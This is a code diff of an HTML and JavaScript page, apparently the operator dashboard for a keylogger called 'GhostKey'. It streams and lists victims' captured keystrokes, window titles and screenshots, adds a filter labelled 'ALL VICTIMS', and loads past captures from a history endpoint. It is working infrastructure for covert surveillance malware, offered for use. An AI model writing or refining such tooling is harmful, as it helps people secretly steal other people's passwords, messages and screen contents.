@@ -1,190 +1,103 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8" />
-<title>GhostKey Live Dashboard — Futuristic</title>
+<html><head><meta charset="UTF-8"><title>GHOSTKEY v3</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap');
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
+  body{margin:0;background:#000;color:#0ff;font-family:'Orbitron',sans-serif;overflow-x:hidden}
+  canvas{position:fixed;top:0;left:0;z-index:-1;opacity:0.2}
+  .container{padding:20px;max-width:1600px;margin:auto}
+  h1{font-size:3.5em;text-shadow:0 0 30px #0ff;letter-spacing:5px}
+  .dot{width:18px;height:18px;background:#0f0;border-radius:50%;box-shadow:0 0 25px #0f0;animation:p 1.5s infinite}
+  @keyframes p{0%,100%{opacity:1}50%{opacity:0.3}}
+  .controls{margin:20px 0;display:flex;gap:20px;align-items:center;flex-wrap:wrap}
+  select{background:#000;border:2px solid #0ff;padding:10px;font-family:inherit;color:#0ff}
+  table{width:100%;border-collapse:collapse;margin-top:20px;background:rgba(0,20,40,0.7);border:2px solid #0ff;box-shadow:0 0 40px rgba(0,255,255,0.4)}
+  th{background:rgba(0,255,255,0.2);padding:15px;color:#0ff;text-shadow:0 0 15px #0ff}
+  td{padding:12px;border-bottom:1px solid rgba(0,255,255,0.3)}
+  .keys{font-family:monospace;background:#001;color:#0f0;padding:8px;border-radius:4px;max-width:600px;overflow:hidden;text-overflow:ellipsis}
+  .ss{max-width:220px;max-height:124px;cursor:pointer;border:3px solid #033;border-radius:8px;transition:0.3s}
+  .ss:hover{border-color:#0ff;transform:scale(1.08);box-shadow:0 0 30px #0ff}
+  .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.98);justify-content:center;align-items:center;z-index:999}
+  .modal img{max-width:95%;max-height:95vh;border:4px solid #0ff;border-radius:12px;box-shadow:0 0 80px #0ff}
+</style></head><body>
 
-  body {
-    background: radial-gradient(circle at center, #020202 0%, #000 70%, #030303 100%);
-    color: #00ffea;
-    font-family: 'Orbitron', monospace;
-    margin: 0;
-    padding: 30px;
-  }
+<canvas id="matrix"></canvas>
+<div class="container">
+  <h1><span class="dot"></span> GHOSTKEY <span style="color:#0f0">v3</span></h1>
+  <div class="controls">
+    <div>Filter Client: 
+      <select id="filter"><option value="">ALL VICTIMS</option></select>
+    </div>
+    <div style="margin-left:auto;color:#0f0">Total Logs: <span id="total">0</span></div>
+  </div>
 
-  h1 {
-    font-size: 2.4em;
-    text-shadow: 0 0 12px #00ffee;
-    margin: 0 0 25px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-  }
-
-  .dot {
-    width: 14px;
-    height: 14px;
-    background: #00ffee;
-    border-radius: 50%;
-    box-shadow: 0 0 15px #00ffee;
-    animation: pulse 1.5s infinite;
-  }
-
-  @keyframes pulse {
-    0%, 100% { opacity: 1; }
-    50% { opacity: 0.3; }
-  }
-
-  .status {
-    margin: 15px 0;
-    font-size: 1.3em;
-    letter-spacing: 1px;
-    text-shadow: 0 0 8px currentColor;
-  }
-
-  .ok { color: #00ffea; }
-  .error { color: #ff4d4d; text-shadow: 0 0 10px #ff4d4d; }
-
-  table {
-    width: 100%;
-    border-collapse: collapse;
-    margin-top: 20px;
-    backdrop-filter: blur(6px);
-    background: rgba(0, 255, 234, 0.05);
-    border: 1px solid rgba(0, 255, 234, 0.15);
-    border-radius: 10px;
-    overflow: hidden;
-  }
-
-  th {
-    background: rgba(0, 255, 234, 0.1);
-    padding: 12px;
-    text-align: left;
-    font-weight: 600;
-    border-bottom: 1px solid rgba(0, 255, 234, 0.15);
-  }
-
-  td {
-    padding: 10px;
-    border-bottom: 1px solid rgba(0, 255, 234, 0.08);
-  }
-
-  tr:hover {
-    background: rgba(0, 255, 234, 0.07);
-    transition: 0.2s;
-  }
-
-  .ss {
-    width: 180px;
-    height: 100px;
-    object-fit: cover;
-    cursor: pointer;
-    border: 2px solid rgba(0, 255, 234, 0.3);
-    border-radius: 8px;
-    transition: 0.25s;
-  }
-
-  .ss:hover {
-    transform: scale(1.05);
-    border-color: #00ffee;
-    box-shadow: 0 0 10px #00ffee;
-  }
-
-  .modal {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.95);
-    justify-content: center;
-    align-items: center;
-    z-index: 999;
-  }
-
-  .modal img {
-    max-width: 95%;
-    max-height: 95vh;
-    border-radius: 14px;
-    box-shadow: 0 0 25px #00ffee;
-  }
-</style>
-</head>
-<body>
-<h1><span class="dot"></span> GhostKey Live Dashboard</h1>
-<div class="status ok" id="status">Starting connection...</div>
-
-<table id="logtable" style="display:none">
-  <thead>
-    <tr>
-      <th>#</th>
-      <th>Time</th>
-      <th>Client</th>
-      <th>Window</th>
-      <th>Keys</th>
-      <th>Screenshot</th>
-    </tr>
-  </thead>
-  <tbody id="logs"></tbody>
-</table>
+  <table><thead><tr>
+    <th>#</th><th>Time</th><th>Client</th><th>Window</th><th>Keys</th><th>Screenshot</th>
+  </tr></thead><tbody id="logs"></tbody></table>
+</div>
 
 <div id="modal" class="modal" onclick="this.style.display='none'">
   <img id="big">
 </div>
 
 <script>
+// Matrix rain
+const c = document.getElementById('matrix'); const ctx = c.getContext('2d');
+c.width = innerWidth; c.height = innerHeight;
+const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+const drops = []; for(let i=0;i<c.width/10;i++) drops[i]=1;
+function draw(){ctx.fillStyle='rgba(0,0,0,0.05)';ctx.fillRect(0,0,c.width,c.height);ctx.fillStyle='#0f0';ctx.font='12px monospace';
+for(let i=0;i<drops.length;i++){let t=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(t,i*10,drops[i]*15);if(drops[i]*15>c.height&&Math.random()>0.975)drops[i]=0;drops[i]++}}
+setInterval(draw,35);
+
+// Dashboard
 let counter = 1;
 const tbody = document.getElementById("logs");
-const table = document.getElementById("logtable");
-const status = document.getElementById("status");
+const filter = document.getElementById("filter");
+const totalEl = document.getElementById("total");
+const clients = new Set();
 
-function connect() {
-  status.textContent = "Connecting to server...";
-  status.className = "status";
+function addLog(d) {
+  if (!d.Client) return;
+  clients.add(d.Client);
+  updateFilter();
 
-  const es = new EventSource("/events");
+  const show = filter.value === "" || filter.value === d.Client;
+  if (!show) return;
 
-  es.onopen = () => {
-    status.textContent = "Connected — waiting for victims...";
-    status.className = "status ok";
-    table.style.display = "table";
-  };
-
-  es.onmessage = (e) => {
-    if (e.data.trim() === "" || e.data.startsWith(":")) return;
-    try {
-      const d = JSON.parse(e.data);
-      const row = document.createElement("tr");
-      const ts = new Date().toISOString().slice(0,19).replace("T"," ");
-
-      row.innerHTML = `
-        <td>${counter++}</td>
-        <td>${ts}</td>
-        <td><b>${d.Client || "?"}</b></td>
-        <td>${d.Window || "Desktop"}</td>
-        <td>${(d.Keys || []).join("").substring(0,150)}${(d.Keys || []).length > 150 ? "..." : ""}</td>
-        <td>${d.Screenshot
-          ? `<img class='ss' src='${d.Screenshot}' onclick="document.getElementById('big').src=this.src;document.getElementById('modal').style.display='flex'">`
-          : "—"}
-        </td>
-      `;
-
-      tbody.insertBefore(row, tbody.firstChild);
-    } catch (e) {}
-  };
-
-  es.onerror = () => {
-    es.close();
-    status.textContent = "Connection lost — retrying in 3s...";
-    status.className = "status error";
-    setTimeout(connect, 3000);
-  };
+  const row = document.createElement("tr");
+  row.innerHTML = `
+    <td>${counter++}</td>
+    <td>${d.timestamp.slice(11,19)}</td>
+    <td><b style="color:#0f0">${d.Client}</b></td>
+    <td>${d.Window||"-"}</td>
+    <td><div class="keys">${(d.Keys||[]).join("") || "<i>no keys</i>"}</div></td>
+    <td>${d.Screenshot ? `<img class="ss" src="${d.Screenshot}" onclick="document.getElementById('big').src=this.src;document.getElementById('modal').style.display='flex'">` : "—"}</td>
+  `;
+  tbody.insertBefore(row, tbody.firstChild);
+  totalEl.textContent = tbody.children.length;
 }
 
-connect();
+function updateFilter() {
+  filter.innerHTML = '<option value="">ALL VICTIMS</option>';
+  [...clients].sort().forEach(c => {
+    const opt = document.createElement("option");
+    opt.value = c; opt.textContent = c;
+    filter.appendChild(opt);
+  });
+}
+
+filter.onchange = () => location.reload(); // simple way: reload + keep filter via URL? or re-filter DOM later
+
+// SSE
+let es = new EventSource("/events");
+es.onmessage = e => {
+  if (!e.data || e.data.startsWith(":")) return;
+  try { addLog(JSON.parse(e.data)); } catch{}
+};
+es.onerror = () => { es.close(); setTimeout(() => es = new EventSource("/events"), 3000); };
+
+// Load history on first connect
+fetch("/history").then(r=>r.json()).then(logs => logs.forEach(addLog));
+
 </script>
-</body>
-</html>
+</body></html>
